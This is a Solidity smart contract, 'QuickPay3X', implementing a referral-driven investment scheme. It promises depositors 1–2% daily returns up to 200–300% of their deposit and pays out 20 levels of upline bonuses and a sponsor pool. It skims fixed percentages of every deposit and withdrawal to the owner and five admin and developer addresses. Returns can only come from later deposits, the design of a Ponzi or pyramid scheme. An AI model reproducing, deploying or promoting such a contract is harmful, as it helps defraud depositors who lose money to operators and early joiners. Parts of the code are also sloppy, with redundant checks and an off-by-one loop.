//SourceUnit: p.sol

pragma solidity 0.5.10;
contract QuickPay3X {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint256 Team_Bonus;
        uint40 deposit_time;
        uint256 DROI;
        uint256 DLimit;
        uint256 TmBonusElg;
    }
    struct usertots
    {
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        uint256 HrAmtreferrals;  
        uint256 total_PoolBonus;
        uint256 total_DestinyBonus;
        uint256 LvlIncD;
        uint256 WithDeduct;
        uint256 Dlmts;
    }
    address payable public owner;
    address payable public admin_fee1;
    address payable public developer_fee;
    address payable public admin_fee;
    address payable public developer_fee2;
    address payable public developer_fee3;

    mapping(address => User) public users;
    mapping(address => usertots) public userTot;
    
    uint256[] public cycles;
    uint256[] public ref_bonuses;

    uint256[] public Daily_ROI; 
    uint256[] public Daily_ROILimit;  
    
    uint8[] public pool_bonuses;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    
    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    uint256 public total_Deduction;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount,uint256 LvlNo, uint256 Refs);
    event TeamBonusPayout(address indexed addr, address indexed from, uint256 amount,uint256 LvlNo, uint256 Refs);
    event MissedLevelPayout(address indexed addr, address indexed from, uint256 amount,uint256 LvlNo, uint256 Refs);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount,uint256 WithDeduct);
    event LimitReached(address indexed addr, uint256 amount);
  
  modifier onlyOwner() {
        require(msg.sender == owner, "only Owner");
        _;
    }
    constructor(address payable _owner,address payable _TPF,address payable _AdminFund,address payable _DevFund,address payable _DevFund2,address payable _DevFund3) public {
        owner = _owner;
        admin_fee1 = _TPF;
        admin_fee = _AdminFund;
        developer_fee = _DevFund;
        developer_fee2 = _DevFund2;
        developer_fee3 = _DevFund3;
        
        ref_bonuses.push(30);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
       
        Daily_ROILimit.push(200);
        Daily_ROILimit.push(300);
 
        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);
        
        cycles.push(500);
        cycles.push(1000);
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }
    
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            
            users[_addr].upline = _upline;
            users[_upline].referrals++;
            
            if (_upline==admin_fee1 || _upline==developer_fee || _upline==developer_fee2 || _upline==developer_fee3 || _upline==admin_fee)
            {
            users[_addr].TmBonusElg=1;
            }
            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;
                userTot[_upline].total_structure++;
                _upline = users[_upline].upline;
            }
        }
    }
    function _deposit(address _addr, uint256 _amount) private {
        //
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        //
        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            require(users[_addr].payouts >= users[_addr].DLimit, "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount, "Bad amount");
            require(_amount == cycles[0] || (_amount%cycles[1])==0, "Bad amount");
        }
        else require(_amount == cycles[0] || (_amount%cycles[1])==0, "Bad amount");
        //
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        userTot[_addr].total_deposits += _amount;
        //
        userTot[_addr].HrAmtreferrals=0;
        userTot[_addr].LvlIncD=0;
        //
        uint256 upldepo=users[users[_addr].upline].deposit_amount;
        //
        if (_amount>=upldepo)
        {
        userTot[users[_addr].upline].HrAmtreferrals+=1;
        }
        //
        users[_addr].DROI=1;
        //
        if(users[_addr].DLimit == 0) {
        //Team Bonus
        _TmBBonus(_addr, _amount);
        }
        //
            if(userTot[_addr].Dlmts==300) 
            {
            users[_addr].DLimit=users[_addr].deposit_amount*Daily_ROILimit[1]/100;
            }
            else
            {
            users[_addr].DLimit=users[_addr].deposit_amount*Daily_ROILimit[0]/100;
            userTot[_addr].Dlmts=Daily_ROILimit[0];
            }
        //
        total_deposited += _amount;
        //    update Upline ROI   
       _updateUplineROI(_addr);
        //
        emit NewDeposit(_addr, _amount);       
        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += (_amount* 5)/100;
            emit DirectPayout(users[_addr].upline, _addr, (_amount* 5)/100);
        }
        _pollDeposits(_addr, _amount);
        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
        }
        
        admin_fee1.transfer(_amount * 2/ 100);
        admin_fee.transfer(_amount * 2/ 100);
        developer_fee.transfer(_amount * 2/ 100);
        developer_fee2.transfer(_amount * 2/ 100);
        developer_fee3.transfer(_amount * 2/ 100);
    }
    //
    function _updateUplineROI(address _addr) private {
        //
            if(userTot[users[_addr].upline].HrAmtreferrals >= 5 && users[users[_addr].upline].DROI==1) {
                 users[users[_addr].upline].DROI=2;
            }
             if(userTot[users[_addr].upline].HrAmtreferrals >= 1) 
            {
                uint256 Dlmmt=users[users[_addr].upline].deposit_amount*Daily_ROILimit[1]/100;
                if (users[users[_addr].upline].DLimit<Dlmmt)
                {
                 users[users[_addr].upline].DLimit=Dlmmt;
                 userTot[users[_addr].upline].Dlmts=Daily_ROILimit[1];
                }
            }
        //
    }
    //
    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += (_amount * 2) / 100;
        address upline = users[_addr].upline;
        if(upline == address(0)) return;
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }
            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;
                break;
            }
            
        }
    }
    //
    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;
        uint256 r1 = 0;
        uint256 rb=0;
        uint256 bonus=0;
        uint256 DepAmt= users[_addr].DLimit;
        require(_amount<=DepAmt,"Profit must be less from Damt!");
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
          //  if(up == address(0)) break;
            bonus=0;
            rb=0;
            rb=users[up].referrals;
            if (up != address(0))
            {
            if (rb>=15) {rb=i + 1;}
            if(rb >= i + 1) {
                bonus = (_amount * ref_bonuses[i]) / 100;
                if (bonus<_amount && bonus>0 && _amount<=DepAmt)
                {
                users[up].match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus,i,rb);
                }
            }
                else 
                { r1+=(_amount * ref_bonuses[i]) / 100;}
            }
          else 
                { r1+=(_amount * ref_bonuses[i]) / 100;}
            up = users[up].upline;
            
        }
        //
        if (r1>0)
        {
            emit MissedLevelPayout(owner,_addr,r1,DepAmt,_amount);
            if (address(this).balance >= r1 && r1<=DepAmt && _amount<=DepAmt)
            {
            owner.transfer(r1);
            }
        }
    }
    function _TmBBonus(address _addr, uint256 _amount) private {
        address tmup = users[_addr].upline;
        uint256 tmrb=0;
        uint256 tmbonus=0;
        tmbonus = (_amount * 3) / 100;
        for(uint8 i = 1; i <= 20; i++) {
            if(tmup == address(0)) break;
            tmrb=users[tmup].TmBonusElg;
            if (tmup != address(0))
            {
            if(tmrb >=1) {
                if (tmbonus<_amount && tmbonus>0)
                {
                users[tmup].Team_Bonus += tmbonus;
                address(uint160(tmup)).transfer(tmbonus);
                emit TeamBonusPayout(tmup, _addr, tmbonus,i,tmrb);
                break;
                }
                }
            }
            tmup = users[tmup].upline;
        }
    }
    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = (pool_balance*20) /100;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = (draw_amount * pool_bonuses[i]) / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;
            
            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");
        
        uint256 to_payoutpd=0;
        // Deposit payout
        if(to_payout > 0) {
            
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }
            //
            if (users[msg.sender].deposit_amount <= (users[msg.sender].deposit_payouts+to_payout) && userTot[msg.sender].LvlIncD==0)
            {
            _refPayout(msg.sender, (users[msg.sender].deposit_amount-users[msg.sender].deposit_payouts));
            userTot[msg.sender].LvlIncD=1;
            }
            else if (users[msg.sender].deposit_amount > users[msg.sender].deposit_payouts && to_payout<=max_payout)
            {
            _refPayout(msg.sender, to_payout);
            }
            //
            if (to_payout<=max_payout)
            {
            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;
            }
            //
        }
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        // Pool payout
        if(users[msg.sender].pool_bonus > 0) {
        uint256 pool_bonus = users[msg.sender].pool_bonus;
        users[msg.sender].pool_bonus -= pool_bonus;
        userTot[msg.sender].total_PoolBonus += pool_bonus;
        to_payout += pool_bonus;
        to_payoutpd+=pool_bonus;
        }
        //Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;
            if(users[msg.sender].payouts + match_bonus > max_payout) {
             match_bonus = max_payout - users[msg.sender].payouts;
            }
          users[msg.sender].match_bonus -= match_bonus;
          users[msg.sender].payouts += match_bonus;
          to_payout += match_bonus;
        }
        //
        if (to_payout>0)
        {
        require(to_payout > 0, "Zero payout");
        uint256 Withd=(to_payout*10/100);
        uint256 netamt=to_payout-Withd;
        
        if (Withd<to_payout && netamt<=to_payout)
        {
        userTot[msg.sender].total_payouts += (to_payout-to_payoutpd);
        total_withdraw += to_payout;
        userTot[msg.sender].WithDeduct+=Withd;
        total_Deduction+=Withd;
        
        msg.sender.transfer(netamt);
        emit Withdraw(msg.sender, to_payout,Withd);
        }
        if(users[msg.sender].payouts >= max_payout) 
        { emit LimitReached(msg.sender, users[msg.sender].payouts);}
        
        }
    }
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout=0;
        payout=0;
        max_payout =users[_addr].DLimit; 
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (((users[_addr].deposit_amount*users[_addr].DROI)/ 100)*((block.timestamp - users[_addr].deposit_time) / 1 days)) - users[_addr].deposit_payouts;
            //
            if(users[_addr].payouts + payout > max_payout) {
                payout = max_payout - users[_addr].payouts;
            }
        }
    }
    function userInfo(address _addr) view external returns(uint256 _WithLimit, uint256 _Team_Bonus, uint256 _deposit_amount, uint256 _payouts,uint256 _direct_bonus, uint256 _pool_bonus, uint256 _match_bonus) {
        return (users[_addr].DLimit,users[_addr].Team_Bonus, users[_addr].deposit_amount, users[_addr].payouts,users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }
    function userInfotot(address _addr) view external returns(uint256 _Total_pool_bonus, uint40 _deposit_time,uint256 _Team_BonusElg, uint256 _Withdeduction,uint256 _totdeduction,uint256 _Dlmts) {
        return (userTot[_addr].total_PoolBonus, users[_addr].deposit_time,users[_addr].TmBonusElg,userTot[_addr].WithDeduct,total_Deduction,userTot[_addr].Dlmts);
    }
    function userInfoTotals(address _addr) view external returns(address _upline,uint256 _referrals, uint256 _total_deposits, uint256 _total_payouts, uint256 _total_structure,uint256 _DROIR,uint256 _DPayouts) {
        return (users[_addr].upline,users[_addr].referrals, userTot[_addr].total_deposits, userTot[_addr].total_payouts, userTot[_addr].total_structure, users[_addr].DROI,users[_addr].deposit_payouts);
    }
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }
    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}